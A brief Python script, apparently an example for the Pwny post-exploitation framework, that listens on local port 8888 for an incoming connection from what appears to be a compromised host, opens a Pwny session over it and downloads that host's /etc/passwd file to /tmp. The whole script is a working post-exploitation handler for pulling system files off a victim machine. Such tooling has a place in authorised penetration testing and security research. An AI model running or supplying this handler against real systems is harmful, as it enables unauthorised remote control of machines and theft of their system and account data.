#!/usr/bin/env python3

import socket

from pwny.session import PwnySession

sock = socket.socket()
sock.bind(('127.0.0.1', 8888))
sock.listen(1)
client, _ = sock.accept()

session = PwnySession()
session.open(client)

session.download('/etc/passwd', '/tmp')
